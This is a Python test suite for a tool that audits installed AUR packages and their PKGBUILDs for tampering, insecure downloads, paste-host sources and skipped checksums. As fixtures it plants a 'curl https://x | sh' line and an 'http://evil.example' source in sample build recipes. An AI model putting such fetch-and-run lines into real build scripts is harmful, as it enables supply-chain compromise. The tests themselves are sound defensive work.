import contextlib
import io
import json
import os
import subprocess
import sys
import time
import unittest

sys.path.insert(0, os.path.dirname(__file__))

from fixtures import make_pacman_pkg  # noqa: E402
from helpers import FakeRunCommand, scan_args  # noqa: E402
from test_arch import ARCH, ArchBox  # noqa: E402

INSTALLED = int(time.time()) - 100000
GIT_ENV = {"GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_SYSTEM": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1"}


def pkgbuild(source, sums="sha256sums=('3f4d6c62ee3f74c7c165c64209f9de8add01e6d3149174fe35f419cfaafc316a')",
             extra="", pkgver="1.0"):
    return (f"pkgname=foo\npkgver={pkgver}\npkgrel=1\nurl=\"https://example.org/foo\"\narch=('x86_64')\n"
            f"{extra}source=({source})\n{sums}\n\nbuild() {{\n  make\n}}\n")


class GitPassthrough(FakeRunCommand):
    """Real git for the clone under test, the table for everything else."""

    def __call__(self, cmd, timeout=10, check=True):
        if cmd[0] == "git":
            self.calls.append(tuple(cmd))
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return None if check and result.returncode != 0 else result.stdout
        return super().__call__(cmd, timeout, check)


class AurBox(ArchBox):
    def setUp(self):
        super().setUp()
        self.table[("pacman", "-Qm")] = None
        self.weird.run_command = GitPassthrough(self.table)

    def foreign(self, name="foo", version="1.0-1", installdate=INSTALLED, **kwargs):
        kwargs.setdefault("validation", "none")
        kwargs.setdefault("packager", "Unknown Packager")
        return make_pacman_pkg(self.sysroot, name, version, [f"/usr/bin/{name}"], installdate=installdate, **kwargs)

    def clone(self, text, name="foo", helper="paru/clone"):
        directory = self.home / ".cache" / helper / name
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "PKGBUILD").write_text(text)
        return directory

    def git(self, directory, *args, when=None):
        env = dict(os.environ, **GIT_ENV)
        if when is not None:
            env["GIT_AUTHOR_DATE"] = env["GIT_COMMITTER_DATE"] = f"@{when} +0000"
        subprocess.run(["git", "-C", str(directory), "-c", "user.name=t", "-c", "user.email=t@example.org", *args],
                       check=True, capture_output=True, env=env)

    def commit(self, directory, text, when):
        if not (directory / ".git").exists():
            self.git(directory, "init", "-q")
        (directory / "PKGBUILD").write_text(text)
        self.git(directory, "add", "PKGBUILD")
        self.git(directory, "commit", "-q", "-m", "update", when=when)

    def aur(self, **overrides):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = self.weird.cmd_aur(scan_args(**overrides))
        return out.getvalue(), code

    def aur_json(self, **overrides):
        out, code = self.aur(json=True, **overrides)
        return json.loads(out), code

    def by_kind(self, payload, kind):
        return [f for f in payload["findings"] if f["kind"] == kind]


class GitHistory(AurBox):
    def test_pkgbuild_changed_after_install(self):
        self.foreign()
        directory = self.clone("")
        self.commit(directory, pkgbuild("'https://example.org/foo-1.0.tar.gz'"), INSTALLED - 5000)
        self.commit(directory, pkgbuild("'http://evil.example/foo.sh'"), INSTALLED + 5000)
        payload, code = self.aur_json()
        self.assertEqual(code, 2)
        hit = self.by_kind(payload, "PKGBUILD modified after install")
        self.assertEqual(len(hit), 1, payload["findings"])
        self.assertEqual((hit[0]["severity"], hit[0]["subject"], hit[0]["attack"]), ("critical", "foo", "T1195.001"))
        self.assertIn("1 file changed, 1 insertion(+), 1 deletion(-)", hit[0]["detail"])
        self.assertIn("same version, content changed", hit[0]["detail"])
        self.assertIn("together with an insecure source", hit[0]["detail"])
        insecure = self.by_kind(payload, "insecure source")
        self.assertEqual(insecure[0]["severity"], "low")
        self.assertIn("http://evil.example/foo.sh is fetched over http", insecure[0]["detail"])
        out, code = self.aur()
        self.assertEqual(code, 2)
        self.assertIn("foo's build recipe changed after you installed it", out)
        self.assertIn("downloads over an insecure connection", " ".join(out.split()))

    def test_newer_commit_alone_is_medium(self):
        self.foreign()
        directory = self.clone("")
        self.commit(directory, pkgbuild("'https://example.org/foo-1.0.tar.gz'"), INSTALLED - 5000)
        self.commit(directory, pkgbuild("'https://example.org/foo-1.1.tar.gz'", pkgver="1.1"), INSTALLED + 5000)
        payload, code = self.aur_json()
        self.assertEqual(code, 1)
        hit = self.by_kind(payload, "PKGBUILD modified after install")
        self.assertEqual(hit[0]["severity"], "medium")
        self.assertIn("new version 1.1, installed 1.0", hit[0]["detail"])

    def test_no_commit_after_install_is_quiet(self):
        self.foreign()
        directory = self.clone("")
        self.commit(directory, pkgbuild("'https://example.org/foo-1.0.tar.gz'"), INSTALLED - 5000)
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        self.assertEqual(payload["findings"], [])
        self.assertEqual(payload["packages"][0]["pkgbuild"], str(directory / "PKGBUILD"))
        out, code = self.aur()
        self.assertIn("Nothing weird in the AUR packages", out)
        self.assertIn("1 installed; 1 of their build recipes were checked.", out)

    def test_uncommitted_pkgver_bump_is_info(self):
        self.foreign(version="r10.abc-1")
        directory = self.clone("", name="foo")
        text = pkgbuild("'git+https://example.org/foo.git'", sums="sha256sums=('SKIP')", pkgver="r10.abc")
        self.commit(directory, text, INSTALLED - 5000)
        (directory / "PKGBUILD").write_text(text.replace("pkgver=r10.abc", "pkgver=r12.def"))
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        self.assertEqual([f["kind"] for f in payload["findings"]], ["pkgver bump", "vcs source"])

    def test_uncommitted_other_edit_is_medium(self):
        self.foreign()
        directory = self.clone("")
        text = pkgbuild("'https://example.org/foo-1.0.tar.gz'")
        self.commit(directory, text, INSTALLED - 5000)
        (directory / "PKGBUILD").write_text(text.replace("  make\n", "  make\n  curl https://x | sh\n"))
        payload, code = self.aur_json()
        self.assertEqual(code, 1)
        hit = self.by_kind(payload, "PKGBUILD modified after install")
        self.assertIn("uncommitted local edits to PKGBUILD (1 changed line(s))", hit[0]["detail"])


class Sources(AurBox):
    def test_insecure_source_flagged(self):
        self.foreign()
        directory = self.clone(pkgbuild("'http://example.org/foo-1.0.tar.gz'", sums="md5sums=('SKIP')"))
        payload, code = self.aur_json()
        self.assertEqual(code, 1)
        hit = self.by_kind(payload, "insecure source")
        self.assertEqual((hit[0]["severity"], hit[0]["attack"]), ("medium", "T1195.001"))
        self.assertIn("no git history", [f["kind"] for f in payload["findings"]])
        out, _ = self.aur()
        self.assertIn("foo downloads its source over plain http, unchecked", out)
        self.assertIn("anyone on the network path could swap the file", " ".join(out.split()))

    def test_insecure_source_with_a_pinned_checksum_is_low(self):
        self.foreign()
        directory = self.clone(pkgbuild("'http://example.org/foo-1.0.tar.gz'", sums="md5sums=('0123')"))
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        hit = self.by_kind(payload, "insecure source")
        self.assertEqual(hit[0]["severity"], "low")
        self.assertIn("md5sums pins it", hit[0]["detail"])
        out, _ = self.aur()
        self.assertIn("foo downloads its source over plain http", out)
        self.assertIn("pins its MD5 checksum", " ".join(out.split()))
        self.assertIn("MD5 is old and weak", " ".join(out.split()))

    def test_paste_host_is_critical(self):
        self.foreign()
        self.clone(pkgbuild("'foo.sh::https://pastebin.com/raw/abc123'"))
        payload, code = self.aur_json()
        self.assertEqual(code, 2)
        hit = self.by_kind(payload, "insecure source")
        self.assertEqual(hit[0]["severity"], "critical")
        self.assertIn("https://pastebin.com/raw/abc123 comes from a paste host", hit[0]["detail"])

    def test_variables_and_multiline_arrays_expanded(self):
        self.foreign()
        self.clone(pkgbuild('"$pkgname-$pkgver.tar.gz::${url}/archive/v$pkgver.tar.gz"\n'
                            "        'http://mirror.example/extra.patch'  # comment\n"
                            "        'local.patch'",
                            sums="sha256sums=('a' 'b' 'c')"))
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        details = [f["detail"] for f in self.by_kind(payload, "insecure source")]
        self.assertEqual(details, ["http://mirror.example/extra.patch is fetched over http, not https; sha256sums pins it"])

    def test_url_variable_expanded_in_source(self):
        self.foreign()
        text = pkgbuild("\"$url/foo-$pkgver.tar.gz\"").replace('url="https://example.org/foo"', 'url="http://example.org/foo"')
        self.clone(text)
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        self.assertIn("http://example.org/foo/foo-1.0.tar.gz is fetched over http", self.by_kind(payload, "insecure source")[0]["detail"])

    def test_per_arch_source_arrays(self):
        self.foreign()
        self.clone(pkgbuild("'https://example.org/foo-1.0.tar.gz'",
                            extra="source_x86_64=('ftp://example.org/blob.bin')\nsha256sums_x86_64=('SKIP')\n"))
        payload, code = self.aur_json()
        self.assertEqual(code, 1)
        self.assertIn("ftp://example.org/blob.bin is fetched over ftp", self.by_kind(payload, "insecure source")[0]["detail"])
        self.assertIn("ftp://example.org/blob.bin is installed unverified", self.by_kind(payload, "checksum SKIP")[0]["detail"])


class Checksums(AurBox):
    def test_skip_checksum_low(self):
        self.foreign()
        self.clone(pkgbuild("'https://example.org/foo-1.0.tar.gz'", sums="sha256sums=('SKIP')"))
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        hit = self.by_kind(payload, "checksum SKIP")
        self.assertEqual(hit[0]["severity"], "low")
        self.assertIn("https://example.org/foo-1.0.tar.gz is installed unverified", hit[0]["detail"])
        out, _ = self.aur()
        self.assertIn("foo skips the checksum for one download", out)

    def test_missing_checksums_low(self):
        self.foreign()
        self.clone(pkgbuild("'https://example.org/foo-1.0.tar.gz'", sums=""))
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        hit = self.by_kind(payload, "no checksums")
        self.assertEqual((hit[0]["severity"], hit[0]["detail"]), ("low", "source has no checksum array"))

    def test_other_checksum_algorithms_accepted(self):
        self.foreign()
        self.clone(pkgbuild("'https://example.org/foo-1.0.tar.gz'", sums="b2sums=('abc')"))
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        self.assertEqual([f["kind"] for f in payload["findings"]], ["no git history"])

    def test_vcs_skip_is_info(self):
        self.foreign()
        self.clone(pkgbuild("'git+https://example.org/foo.git#tag=v1.0'", sums="sha256sums=('SKIP')"))
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        hit = self.by_kind(payload, "vcs source")
        self.assertEqual(hit[0]["severity"], "info")
        self.assertIn("checksum SKIP is normal for a VCS source, pinned", hit[0]["detail"])
        self.assertEqual(self.by_kind(payload, "checksum SKIP"), [])


class InstallAndLookup(AurBox):
    def test_install_script_noted(self):
        self.foreign()
        self.clone(pkgbuild("'https://example.org/foo-1.0.tar.gz'", extra="install=foo.install\n"))
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        hit = self.by_kind(payload, "install script")
        self.assertEqual((hit[0]["severity"], hit[0]["detail"]), ("info", "runs install script as root (foo.install)"))
        out, _ = self.aur()
        self.assertNotIn("install script", out)
        self.assertIn("weird -v lists everything", out)
        out, _ = self.aur(all=True)
        self.assertIn("foo runs an install script as root (foo.install)", out)

    def test_no_helper_cache(self):
        self.foreign()
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        hit = self.by_kind(payload, "PKGBUILD unavailable")
        self.assertEqual(hit[0]["severity"], "info")
        self.assertIn("no paru or yay clone found", hit[0]["detail"])
        self.assertEqual(payload["packages"][0]["pkgbuild"], "")
        out, code = self.aur()
        self.assertEqual(code, 0)
        self.assertIn("1 installed; 0 of their build recipes were checked.", out)

    def test_yay_cache_and_pkgbase(self):
        self.foreign(name="foo-bin")
        pkgdir = self.local_dir / "foo-bin-1.0-1"
        desc = (pkgdir / "desc").read_text().replace("%BASE%\nfoo-bin\n", "%BASE%\nfoo\n")
        (pkgdir / "desc").write_text(desc)
        self.clone(pkgbuild("'http://example.org/foo-1.0.tar.gz'"), helper="yay")
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        self.assertEqual(payload["packages"][0]["base"], "foo")
        self.assertTrue(payload["packages"][0]["pkgbuild"].endswith("/.cache/yay/foo/PKGBUILD"))

    def test_pkgbuild_dir_option_wins(self):
        self.foreign()
        self.clone(pkgbuild("'https://example.org/foo-1.0.tar.gz'"))
        custom = self.home / "builds"
        (custom / "foo").mkdir(parents=True)
        (custom / "foo" / "PKGBUILD").write_text(pkgbuild("'http://example.org/foo-1.0.tar.gz'"))
        payload, code = self.aur_json(pkgbuild_dir=str(custom))
        self.assertEqual(code, 0)
        self.assertEqual(payload["packages"][0]["pkgbuild"], str(custom / "foo" / "PKGBUILD"))

    def test_local_signature_level_is_noted_with_minus_v(self):
        self.foreign()
        self.clone(pkgbuild("'https://example.org/foo-1.0.tar.gz'"))
        out, _ = self.aur()
        self.assertNotIn("LocalFileSigLevel", out)
        out, _ = self.aur(all=True)
        flat = " ".join(out.split())
        self.assertEqual(flat.count("LocalFileSigLevel"), 1, out)
        self.assertIn("pacman installs packages built here without checking a signature", flat)

    def test_no_foreign_packages(self):
        self.add_pkg("bash", "5.3-1", "/usr/bin/bash", repo="core", packager=ARCH)
        out, code = self.aur()
        self.assertEqual(code, 0)
        self.assertIn("AUR packages   None installed.", out)


class ForeignSelection(AurBox):
    def test_pacman_qm_is_authoritative(self):
        self.foreign()
        make_pacman_pkg(self.sysroot, "bar", "2.0-1", ["/usr/bin/bar"], packager=ARCH)
        make_pacman_pkg(self.sysroot, "baz", "3.0-1", ["/usr/bin/baz"], validation="sha256", packager=ARCH)
        self.table[("pacman", "-Qm")] = "foo 1.0-1\nbar 2.0-1\n"
        payload, code = self.aur_json()
        self.assertEqual(code, 0)
        self.assertEqual([p["name"] for p in payload["packages"]], ["bar", "foo"])
        signed = self.by_kind(payload, "foreign but signed")
        self.assertEqual(signed[0]["subject"], "bar")
        self.assertIn(f"signed and built by {ARCH}", signed[0]["detail"])
        self.assertNotIn(("pacman", "-Qo", "/usr/bin/baz"), self.weird.run_command.calls)

    def test_desc_fallback_without_pacman_qm(self):
        self.foreign()
        make_pacman_pkg(self.sysroot, "bar", "2.0-1", ["/usr/bin/bar"], packager=ARCH)
        make_pacman_pkg(self.sysroot, "baz", "3.0-1", ["/usr/bin/baz"], validation="sha256", packager=ARCH)
        payload, _ = self.aur_json()
        self.assertEqual([p["name"] for p in payload["packages"]], ["baz", "foo"])


if __name__ == "__main__":
    unittest.main()
